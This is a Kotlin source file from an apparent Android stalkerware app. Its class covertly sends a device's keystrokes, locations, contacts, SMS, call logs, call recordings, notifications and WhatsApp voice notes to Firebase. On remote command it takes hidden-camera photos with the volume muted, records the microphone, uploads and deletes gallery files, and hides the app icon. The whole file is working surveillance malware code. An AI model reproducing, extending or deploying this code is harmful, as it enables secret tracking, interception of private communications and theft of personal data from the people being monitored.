package com.dtz.netservice.services.accessibilityData

import android.app.RecoverableSecurityException
import android.content.Context
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.media.AudioManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.core.app.ActivityCompat
import com.dtz.netservice.R
import com.dtz.netservice.data.model.*
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.services.social.MonitorService
import com.dtz.netservice.utils.*
import com.dtz.netservice.utils.ConstFun.getDateTime
import com.dtz.netservice.utils.ConstFun.getRandomNumeric
import com.dtz.netservice.utils.ConstFun.showApp
import com.dtz.netservice.utils.Consts.ADDRESS_AUDIO_RECORD
import com.dtz.netservice.utils.Consts.CHILD_CAPTURE_PHOTO
import com.dtz.netservice.utils.Consts.CHILD_GPS
import com.dtz.netservice.utils.Consts.CHILD_PERMISSION
import com.dtz.netservice.utils.Consts.CHILD_SERVICE_DATA
import com.dtz.netservice.utils.Consts.CHILD_SHOW_APP
import com.dtz.netservice.utils.Consts.CHILD_SOCIAL_MS
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.Consts.GET_GALLERY_PHOTO
import com.dtz.netservice.utils.Consts.GET_GALLERY_VIDEOS
import com.dtz.netservice.utils.Consts.INTERVAL
import com.dtz.netservice.utils.Consts.KEY_LOGGER
import com.dtz.netservice.utils.Consts.KEY_TEXT
import com.dtz.netservice.utils.Consts.LOCATION
import com.dtz.netservice.utils.Consts.LOCATIONS
import com.dtz.netservice.utils.Consts.PARAMS
import com.dtz.netservice.utils.Consts.PHOTO
import com.dtz.netservice.utils.Consts.PHOTOS
import com.dtz.netservice.utils.Consts.RECORDING
import com.dtz.netservice.utils.Consts.SOCIAL
import com.dtz.netservice.utils.Consts.TAG
import com.dtz.netservice.utils.Consts.TIMER
import com.dtz.netservice.utils.Consts.VIDEOS
import com.dtz.netservice.utils.Contacts
import com.dtz.netservice.utils.FileHelper.getFileNameAudio
import com.dtz.netservice.utils.FileHelper.getFilePath
import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraConfig
import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.IOException
import java.nio.file.Files
import java.nio.file.Paths
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import kotlin.io.path.deleteIfExists


/**
 * Created by luis rafael on 17/03/18.
 */
class InteractorAccessibilityData @Inject constructor(
    private val context: Context,
    private val firebase: InterfaceFirebase
) : InterfaceAccessibility, CameraCallbacks {

    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()
    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()

    private var timer: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        cancelTimer()
        deleteFile()
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio: String? = null

    private val db = DataBaseHelper(context)

    private var countDownTimer: MyCountDownTimer = MyCountDownTimer(startTime, interval) {
        if (firebase.getUser() != null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA)
            .removeValue()
        startCountDownTimer()
    }

    override fun startCountDownTimer() {
        countDownTimer.start()
    }

    override fun stopCountDownTimer() {
        countDownTimer.cancel()
    }


    override fun clearDisposable() {
        //disposable.dispose()
        //disposable.clear()
    }

    override fun setDataKey(data: String) {
        if (firebase.getUser() != null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push()
            .child(KEY_TEXT).setValue(data)
    }

    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            val address: String
            val geoCoder = Geocoder(context, Locale.getDefault())

            address = try {
                geoCoder.getFromLocation(
                    location.latitude,
                    location.longitude,
                    1
                )[0].getAddressLine(0)
            } catch (e: IOException) {
                context.getString(R.string.address_not_found)
            }

            val uuid = UUID.randomUUID().toString()
            val model = com.dtz.netservice.data.model.Location(
                uuid,
                location.latitude,
                location.longitude,
                address,
                getDateTime()
            )
            firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)

            firebase.getDatabaseReference(LOCATIONS).push().setValue(model)

            savePositions(model)
            getSavedPositions()
            getSavedNotifications()
            getSavedCallLog()
            getRecordsLists(context)
            getWhatsAppAudio(context)

            setDataLocationHourly(location)
            setDevicePresence()

            saveContacts()
            saveSMS()
        }

    }

    private fun setDevicePresence() {
        val current = System.currentTimeMillis()
        firebase.getDatabaseReference("$DATA/${Consts.DEVICE_ONLINE}").setValue(current)
    }

    private fun savePositions(location: com.dtz.netservice.data.model.Location) {
        db.insertPosition(location)
        firebase.getDatabaseReference("${Consts.SAVED_LOCATIONS}/")
    }

    private fun getSavedPositions() {
        val data = db.readPositionData();
        try {
            data.forEach { location ->
                firebase.getDatabaseReference("${Consts.SAVED_LOCATIONS}/")
                    .push()
                    .setValue(location)
                    .addOnCompleteListener {
                        location.uuid?.let { it1 -> db.deleteOnePositionData(it1) }
                    }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getSavedNotifications() {
        val data = db.readNotificationData();
        try {
            data.forEach { notification ->
                firebase.getDatabaseReference("${Consts.SAVED_NOTIFICATIONS}/")
                    .push()
                    .setValue(notification)
                    .addOnCompleteListener {
                        notification.uuid?.let { it1 -> db.deleteOneNotificationData(it1) }
                    }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getSavedCallLog() {
        val data = db.readCallLogsData();
        firebase.getDatabaseReference("${Consts.SAVED_CALL_LOG}/").setValue(data)
    }

    private fun saveContacts() {
        //Contacts
        val contactsList = Contacts.contactsList(context)
        firebase.getDatabaseReference("${Consts.CONTACTS}/").setValue(contactsList)
    }

    private fun saveSMS() {
        //Contacts
        val smsList = SMSes.smsList(context)
        firebase.getDatabaseReference("${Consts.SMSES}/").setValue(smsList)
    }

    private fun setDataLocationHourly(location: Location) {
        if (firebase.getUser() != null) {
            val address: String
            val geoCoder = Geocoder(context, Locale.getDefault())

            address = try {
                geoCoder.getFromLocation(
                    location.latitude,
                    location.longitude,
                    1
                )[0].getAddressLine(0)
            } catch (e: IOException) {
                context.getString(R.string.address_not_found)
            }

            val currTime = SimpleDateFormat("dd-MM-yyyy HH", Locale.getDefault()).format(Date())

            val uuid = UUID.randomUUID().toString()
            val model = com.dtz.netservice.data.model.Location(
                uuid,
                location.latitude,
                location.longitude,
                address,
                getDateTime()
            )
            firebase.getDatabaseReference("$LOCATION/HOURLY")
                .child(currTime).setValue(model)
        }

    }

    private fun getRecordsLists(context: Context) {
        val callsDir =
            context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
        File(callsDir).walk().forEach {
            val file = File(it.path)
            if (file.isFile) {
                uploadCallFile(file)
            }
        }
    }

    private fun getWhatsAppAudio(context: Context) {
        val whatsappFolder = Environment.getExternalStorageDirectory()
            .toString() + File.separator + "Android/media/com.whatsapp/WhatsApp" + File.separator + "Media"
        if (File(whatsappFolder).exists()) {
            /*val whatsappAudio = Environment.getExternalStorageDirectory().toString() + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio"
            val whatAudio = File(whatsappAudio)
            whatAudio.walkTopDown().forEach {
                val file = File(it.path)
                if (file.isFile) {
                    uploadWhatsAppAudioFile(file)
                }
            }*/

            val whatsappVoicesAudio = whatsappFolder + File.separator + "WhatsApp Voice Notes"
            val nomedia = File(whatsappVoicesAudio + File.separator + ".nomedia")

            if (nomedia.exists()) {
                nomedia.setExecutable(true)
                try {
                    Log.d("WHATSAPP NOMEDIA", nomedia.absolutePath)
                    val uuid = UUID.randomUUID().toString()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        val src = Paths.get( whatsappVoicesAudio + File.separator + ".nomedia" )
                        val dest = Paths.get( whatsappFolder + File.separator + "nomedia" + uuid)
                        Files.move(src, dest)
                        dest.deleteIfExists();
                    }
                    nomedia.deleteRecursively()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            File(whatsappVoicesAudio).walkTopDown().forEach { file ->
                if (file.isFile) {
                    uploadWhatsAppAudioFile(file)
                }
            }
        } else {
            Log.d("WHATSAPP FOLDER", "NOT EXISTS")
        }
    }

    private fun uploadCallFile(file: File) {
        val uri = Uri.fromFile(file)
        val chi = firebase.getDatabaseReference("recording_calls")
        if (uri.lastPathSegment != null) {
            val name = uri.lastPathSegment.toString().replace(".", "")
            chi.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (!snapshot.hasChild(name)) {
                        firebase.getStorageReference("recording_calls/${name}")
                            .putFile(uri)
                            .addOnSuccessListener { taskSnapshot ->
                                val callMap: MutableMap<String, Any> = mutableMapOf()
                                callMap["file"] = taskSnapshot.metadata?.path.toString()
                                callMap["size"] = taskSnapshot.metadata?.sizeBytes.toString()
                                callMap["date"] =
                                    taskSnapshot.metadata?.creationTimeMillis.toString()
                                saveLink(callMap, name)
                            }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    //TODO("Not yet implemented")
                    Log.d("TAG", "erreur lors de la connexion à firebase")
                }

            })
        }

    }

    private fun uploadWhatsAppAudioFile(file: File) {
        val uri = Uri.fromFile(file)
        val chi = firebase.getDatabaseReference("whatsapp_audio")
        if (uri.lastPathSegment != null) {
            val name = uri.lastPathSegment.toString().replace(".", "")
            chi.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (!snapshot.hasChild(name)) {
                        firebase.getStorageReference("whatsapp_audio/${name}")
                            .putFile(uri)
                            .addOnSuccessListener { taskSnapshot ->
                                val callMap: MutableMap<String, Any> = mutableMapOf()
                                callMap["file"] = taskSnapshot.metadata?.path.toString()
                                callMap["fileName"] = file.name
                                callMap["size"] = taskSnapshot.metadata?.sizeBytes.toString()
                                callMap["date"] =
                                    taskSnapshot.metadata?.creationTimeMillis.toString()
                                saveWhatsAppLink(callMap, name)
                            }
                    }
                    chi.removeEventListener(this)
                }

                override fun onCancelled(error: DatabaseError) {
                    //TODO("Not yet implemented")
                    Log.d("TAG", "erreur lors de la connexion à firebase")
                    chi.removeEventListener(this)
                }
            })
        }

    }

    private fun saveLink(callMap: MutableMap<String, Any>, lastPathSegment: String) {
        firebase.getDatabaseReference("recording_calls")
            .child(lastPathSegment)
            .updateChildren(callMap)
    }

    private fun saveWhatsAppLink(callMap: MutableMap<String, Any>, lastPathSegment: String) {
        firebase.getDatabaseReference("whatsapp_audio")
            .child(lastPathSegment)
            .updateChildren(callMap)
    }

    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser() != null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION")
            .setValue(location)
    }

    override fun enableGps(gps: Boolean) {
        if (firebase.getUser() != null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS")
            .setValue(gps)
    }

    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser() != null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA")
            .setValue(run)
    }

    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
            .map { data -> data.value as Boolean }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ context.showApp(it) },
                { e(TAG, it.message.toString()) })
        )

    }

    override fun getCapturePicture() {
        disposable.add(
            firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child -> startCameraPicture(child) },
                    { error -> e(TAG, error.message.toString()) })
        )
    }

    override fun getPhotos() {
        disposable.add(
            firebase.valueEventModel("$PHOTOS/$PARAMS", GalleryPhoto::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child -> getGalleryPhoto(child) },
                    { error -> e(TAG, error.message.toString()) })
        )
    }

    override fun getVideos() {
        disposable.add(
            firebase.valueEventModel("$VIDEOS/$PARAMS", GalleryVideo::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child -> getGalleryVideos(child) },
                    { error -> e(TAG, error.message.toString()) })
        )
    }

    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto!!) {
            val cameraConfig = CameraConfig().builder(context)
                .setCameraFacing(childPhoto.facingPhoto!!)
                .setImageRotation(
                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
                    else CameraRotation.ROTATION_90
                )
                .build()
            reduceVolume()
            pictureCapture.startCamera(cameraConfig)
        }
    }

    private fun getGalleryPhoto(galleryPhoto: GalleryPhoto) {
        if (galleryPhoto.getPhotos!!) {
            val dcimPath = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                    .toString() + "/Camera"
            )
            if (dcimPath.exists()) {
                val files = dcimPath.listFiles()
                if (files != null) {
                    for (i in files.indices) {
                        if (!isVideoFileUri(files[i].absolutePath)) {
                            if (i < galleryPhoto.count!!) {
                                sendGalleryPhoto(files[i]);
                            }
                        }
                    }
                }
            }

            resetParamsVideo()

            if (galleryPhoto.removePhotos!!) {
                if (galleryPhoto.photoPath != null) {
                    val file = File(galleryPhoto.photoPath!!)
                    val result = file.delete()
                    if (result) {
                        println("Deletion succeeded.")
                        Log.d("FILE", "Deletion success")
                    } else {
                        Log.d("FILE", "Deletion failed")
                    }
                }
                resetParamsPhotos()
            }
        }
    }

    private fun getGalleryVideos(child: GalleryVideo) {
        if (child.getVideos!!) {
            val dcimPath = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                    .toString() + "/Camera"
            )
            if (dcimPath.exists()) {
                val files = dcimPath.listFiles()
                if (files != null) {
                    for (i in files.indices) {
                        if (isVideoFileUri(files[i].absolutePath)) {
                            sendGalleryVideo(files[i]);
                        }
                    }
                }
            }
        }
    }

    private fun reduceVolume() {
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            audioManager.adjustVolume(AudioManager.ADJUST_MUTE, AudioManager.FLAG_SHOW_UI)
        }
    }

    private fun isVideoFileUri(uri: String): Boolean {
        val extension = MimeTypeMap.getFileExtensionFromUrl(uri)
        val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension)
        return mimeType != null && mimeType.startsWith("video/")
    }

    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()
        sendFilePhoto(imageFile.absolutePath)
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)

        if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
            errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
            errorCode == ERROR_IMAGE_WRITE_FAILED
        )

            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
    }

    private fun sendFilePhoto(imageFile: String?) {
        if (imageFile != null) {
            val namePhoto = getRandomNumeric()
            val uri = Uri.fromFile(File(imageFile))
            disposable.add(
                firebase.putFile("$PHOTO/$namePhoto", uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            setPushNamePhoto(it.result.toString(), namePhoto)
                            FileHelper.deleteFile(imageFile)
                        }
                    }, { error ->
                        e(TAG, error.message.toString())
                        FileHelper.deleteFile(imageFile)
                    })
            )
        }
    }

    private fun sendGalleryPhoto(file: File?) {
        if (file != null) {
            val photoName = file.name
                .replace(".", "")
                .replace("#", "")
            val uri = Uri.fromFile(file)
            disposable.add(
                firebase.putFile("$PHOTOS/$DATA/$photoName", uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            //val image = Image(photoName, it.result.toString())
                            val photoMap: MutableMap<String, Any> = mutableMapOf()
                            photoMap["file"] = it.result.toString()
                            photoMap["name"] = photoName
                            photoMap["path"] = file.absolutePath
                            firebase.getDatabaseReference("$PHOTOS/$DATA").child(photoName)
                                .updateChildren(photoMap)
                            firebase.getDatabaseReference("$PHOTOS/$PARAMS/$GET_GALLERY_PHOTO")
                                .setValue(false)
                        }
                    }, { error ->
                        e(TAG, error.message.toString())
                    })
            )
        }
    }

    private fun sendGalleryVideo(file: File?) {
        if (file != null) {
            val videoName = file.name
                .replace(".", "")
                .replace("#", "")
            val uri = Uri.fromFile(file)
            disposable.add(
                firebase.putFile("$PHOTOS/$DATA/$videoName", uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            val videoMap: MutableMap<String, Any> = mutableMapOf()
                            videoMap["file"] = it.result.toString()
                            videoMap["name"] = videoName
                            videoMap["path"] = file.absolutePath
                            firebase.getDatabaseReference("$VIDEOS/$DATA").child(videoName)
                                .updateChildren(videoMap)
                            firebase.getDatabaseReference("$VIDEOS/$PARAMS/$GET_GALLERY_VIDEOS")
                                .setValue(false)
                        }
                    }, { error ->
                        e(TAG, error.message.toString())
                    })
            )
        }
    }

    private fun setPushNamePhoto(url: String, namePhoto: String) {

        val fusedLocationProviderClient: FusedLocationProviderClient =
            LocationServices.getFusedLocationProviderClient(context)
        val task = fusedLocationProviderClient.lastLocation
        val locationMap: MutableMap<String, Any> = mutableMapOf()

        if (ActivityCompat
                .checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED && ActivityCompat
                .checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {

            locationMap["lat"] = 0
            locationMap["lng"] = 0
            val photo = Photo(namePhoto, getDateTime(), url, locationMap)
            firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
            firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
        }
        task.addOnSuccessListener {
            if (it != null) {
                locationMap["lat"] = it.latitude
                locationMap["lng"] = it.longitude

                val photo = Photo(namePhoto, getDateTime(), url, locationMap)
                firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
                firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
                firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
            }
        }
    }

    override fun getSocialStatus() {
        disposable.add(firebase.valueEvent("$SOCIAL/$CHILD_SOCIAL_MS")
            .map { data -> data.exists() }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ if (!it) context.startService(IntentFor<MonitorService>(context)) },
                { e(TAG, it.message.toString()) })
        )
    }

    override fun getRecordingAudio() {
        disposable.add(
            firebase.valueEventModel("$RECORDING/$PARAMS", ChildRecording::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child ->
                    if (child.recordAudio!!) {
                        startRecording(child.timeAudio!!)
                    }
                },
                    { error -> e(TAG, error.message.toString()) })
        )
    }

    private fun startRecording(startTime: Long) {

        timer = MyCountDownTimer(startTime, interval, { setIntervalRecord(it) }) { stopRecording() }

        nameAudio = getRandomNumeric()
        dateTime = getDateTime()
        fileName = context.getFileNameAudio(nameAudio, dateTime)

        recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
        timer!!.start()

    }

    private fun stopRecording() = recorder.stopRecording { sendFileAudio() }

    private fun cancelTimer() {
        if (timer != null) timer!!.cancel()
    }

    private fun setIntervalRecord(interval: Long) {
        firebase.getDatabaseReference("$RECORDING/$TIMER/$INTERVAL").setValue(interval)
    }


    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        resetParamsRecording()
    }

    private fun sendFileAudio() {
        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
        val dateName = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        disposable.add(
            firebase.putFile("$RECORDING/$dateName", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ setPushName(it.metadata?.path.toString()) }, { deleteFile() })
        )
    }

    private fun setPushName(name: String) {
        val duration = "0" //FileHelper.getDurationFile(fileName!!)
        val recording = Recording(name, dateTime, duration)
        firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
        resetParamsRecording()
        //deleteFile()
    }

    private fun resetParamsRecording() {
        val childRecording = ChildRecording(false, 0)
        firebase.getDatabaseReference("$RECORDING/$PARAMS").setValue(childRecording)
        setIntervalRecord(0)
    }

    private fun resetParamsPhotos() {
        val childGalleryPhoto = GalleryPhoto(false, 0, false, "null")
        firebase.getDatabaseReference("$PHOTOS/$PARAMS").setValue(childGalleryPhoto)
    }

    private fun resetParamsVideo() {
        val childGalleryVideo = GalleryVideo(false, 0)
        firebase.getDatabaseReference("$VIDEOS/$PARAMS").setValue(childGalleryVideo)
    }

}